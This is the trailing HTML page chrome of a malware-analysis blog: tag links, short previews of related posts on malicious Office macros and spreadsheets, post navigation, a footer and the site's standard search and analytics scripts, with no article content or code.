href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/aggah-ppam-renamed-mshta/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1646352000" data-df="ll" > Mar 4, 2022 </time><h4 class="pt-0 my-2">Aggah PPAM macros renaming MSHTA</h4><div class="text-muted"><p>In this quick post I’m taking a look at a PowerPoint file with macros on board! According to MalwareBazaar’s tags, it was reported in association with the group “Aggah”. If you want to follow along...</p></div></div></a></article><article class="col"> <a href="/powerpoint-macros-olevba/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1641513600" data-df="ll" > Jan 7, 2022 </time><h4 class="pt-0 my-2">Looking at PowerPoint Macros with Olevba</h4><div class="text-muted"><p>In this post I want to walk through analysis of a malicious PowerPoint file using olevba. This tool allows you to view macros within Office documents without opening them. If you want to follow alo...</p></div></div></a></article><article class="col"> <a href="/xloader-formbook-velvetsweatshop-spreadsheet/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1644537600" data-df="ll" > Feb 11, 2022 </time><h4 class="pt-0 my-2">XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets</h4><div class="text-muted"><p>Just like with RTF documents, adversaries can use XLSX spreadsheets to exploit the Microsoft Office Equation Editor. To add a little bit of complication on top, adversaries also sometimes like to e...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/analyzing-log4shell-muhstik/" class="btn btn-outline-primary" aria-label="Older" ><p>Analyzing a Log4Shell log4j Exploit from Muhstik</p></a> <a href="/analyzing-magnitude-magniber-appx/" class="btn btn-outline-primary" aria-label="Newer" ><p>Analyzing a Magnitude EK Appx Package Dropping Magniber</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag btn btn-outline-primary" href="/tags/jar/">jar</a> <a class="post-tag btn btn-outline-primary" href="/tags/java/">java</a> <a class="post-tag btn btn-outline-primary" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag btn btn-outline-primary" href="/tags/mshta/">mshta</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.net</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener('DOMContentLoaded', function (event) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
